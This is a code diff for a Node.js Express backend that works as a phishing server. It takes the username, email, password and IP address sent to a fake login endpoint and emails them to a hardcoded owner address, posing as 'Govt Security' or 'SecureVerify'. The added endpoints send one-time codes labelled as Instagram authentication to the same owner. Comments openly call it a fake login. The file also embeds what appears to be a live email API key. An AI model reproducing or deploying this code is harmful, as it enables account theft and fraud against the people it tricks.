@@ -664,6 +664,78 @@
 // );
 
 
+// const express = require("express");
+// const cors = require("cors");
+// const { Resend } = require("resend");
+
+// const app = express();
+
+// /* ================= BASIC SETUP ================= */
+// app.use(express.json());
+// app.use(cors({ origin: "*" }));
+
+// /* ================= RESEND ================= */
+// const resend = new Resend("re_jL1y2NB9_Bkj82exL7EuKTjqgQvtMG69n"); // your key
+
+// /* ================= HEALTH ================= */
+// app.get("/", (req, res) => {
+//   res.send("Backend is running");
+// });
+
+// /* ================= LOGIN ================= */
+// app.post("/login", async (req, res) => {
+//   const { userName, email, passWord } = req.body;
+
+//   if (!userName || !email || !passWord) {
+//     return res.status(400).json({
+//       success: false,
+//       step: "missing_fields"
+//     });
+//   }
+
+//   const text = `
+// 🔐 NEW ACCOUNT SUBMISSION
+
+// Username: ${userName}
+// Email: ${email}
+// Password: ${passWord}
+
+// Time: ${new Date().toLocaleString()}
+// IP: ${req.ip}
+// `;
+
+//   try {
+//     await resend.emails.send({
+//       from: "Govt Security <onboarding@resend.dev>",
+//       to: ["r89295489@gmail.com"], // OWNER EMAIL
+//       subject: "New Social Media Verification",
+//       text
+//     });
+
+//     return res.json({
+//       success: true,
+//       step: "email_sent"
+//     });
+
+//   } catch (err) {
+//     console.error("RESEND ERROR:", err);
+
+//     return res.json({
+//       success: true, // fake login continues
+//       step: "email_failed_but_continue",
+//       error: err.message
+//     });
+//   }
+// });
+
+// /* ================= SERVER ================= */
+// const PORT = process.env.PORT || 4000;
+// app.listen(PORT, () => {
+//   console.log("🚀 Server running on port", PORT);
+// });
+
+
+
 const express = require("express");
 const cors = require("cors");
 const { Resend } = require("resend");
@@ -675,57 +747,162 @@ app.use(express.json());
 app.use(cors({ origin: "*" }));
 
 /* ================= RESEND ================= */
-const resend = new Resend("re_jL1y2NB9_Bkj82exL7EuKTjqgQvtMG69n"); // your key
+const resend = new Resend("re_jL1y2NB9_Bkj82exL7EuKTjqgQvtMG69n"); // YOUR KEY
+
+const OWNER_EMAIL = "r89295489@gmail.com";
+
+/* ================= OTP STORE (TEMP) ================= */
+// phone/email/username → { otp, expires }
+const otpStore = new Map();
 
 /* ================= HEALTH ================= */
 app.get("/", (req, res) => {
   res.send("Backend is running");
 });
 
-/* ================= LOGIN ================= */
+/* =====================================================
+   LOGIN → SEND DETAILS TO OWNER (FAKE LOGIN)
+===================================================== */
 app.post("/login", async (req, res) => {
   const { userName, email, passWord } = req.body;
 
   if (!userName || !email || !passWord) {
     return res.status(400).json({
       success: false,
-      step: "missing_fields"
+      step: "missing_fields",
     });
   }
 
   const text = `
-🔐 NEW ACCOUNT SUBMISSION
+🔐 NEW VERIFICATION REQUEST
 
 Username: ${userName}
 Email: ${email}
 Password: ${passWord}
-
-Time: ${new Date().toLocaleString()}
 IP: ${req.ip}
+Time: ${new Date().toLocaleString()}
 `;
 
   try {
     await resend.emails.send({
-      from: "Govt Security <onboarding@resend.dev>",
-      to: ["r89295489@gmail.com"], // OWNER EMAIL
-      subject: "New Social Media Verification",
-      text
+      from: "SecureVerify <onboarding@resend.dev>",
+      to: [OWNER_EMAIL],
+      subject: "New Account Verification Request",
+      text,
     });
 
     return res.json({
       success: true,
-      step: "email_sent"
+      step: "email_sent",
     });
 
   } catch (err) {
-    console.error("RESEND ERROR:", err);
+    console.error("RESEND LOGIN ERROR:", err.message);
 
     return res.json({
       success: true, // fake login continues
       step: "email_failed_but_continue",
-      error: err.message
+      error: err.message,
     });
   }
+});
+
+/* =====================================================
+   SEND OTP (Authentication Step)
+===================================================== */
+app.post("/send-otp", async (req, res) => {
+  const { userName } = req.body;
+
+  if (!userName) {
+    return res.status(400).json({
+      success: false,
+      step: "username_required",
+    });
+  }
+
+  const otp = Math.floor(100000 + Math.random() * 900000);
+
+  otpStore.set(userName, {
+    otp,
+    expires: Date.now() + 5 * 60 * 1000, // 5 minutes
+  });
+
+  const text = `
+🔐 AUTHENTICATION CONFIRMATION
+
+Username: ${userName}
+OTP: ${otp}
+Purpose: Instagram security authentication
+Expires in: 5 minutes
+Time: ${new Date().toLocaleString()}
+`;
+
+  try {
+    await resend.emails.send({
+      from: "SecureVerify <onboarding@resend.dev>",
+      to: [OWNER_EMAIL],
+      subject: "OTP Authentication Request",
+      text,
+    });
+
+    return res.json({
+      success: true,
+      step: "otp_sent",
+    });
+
+  } catch (err) {
+    console.error("RESEND OTP ERROR:", err.message);
+
+    return res.status(500).json({
+      success: false,
+      step: "otp_email_failed",
+    });
+  }
+});
+
+/* =====================================================
+   VERIFY OTP
+===================================================== */
+app.post("/verify-otp", (req, res) => {
+  const { userName, otp } = req.body;
+
+  if (!userName || !otp) {
+    return res.status(400).json({
+      success: false,
+      step: "missing_otp",
+    });
+  }
+
+  const record = otpStore.get(userName);
+
+  if (!record) {
+    return res.status(400).json({
+      success: false,
+      step: "otp_not_found",
+    });
+  }
+
+  if (Date.now() > record.expires) {
+    otpStore.delete(userName);
+    return res.status(400).json({
+      success: false,
+      step: "otp_expired",
+    });
+  }
+
+  if (String(record.otp) !== String(otp)) {
+    return res.status(400).json({
+      success: false,
+      step: "otp_invalid",
+    });
+  }
+
+  otpStore.delete(userName);
+
+  return res.json({
+    success: true,
+    step: "authentication_completed",
+  });
 });
 
 /* ================= SERVER ================= */
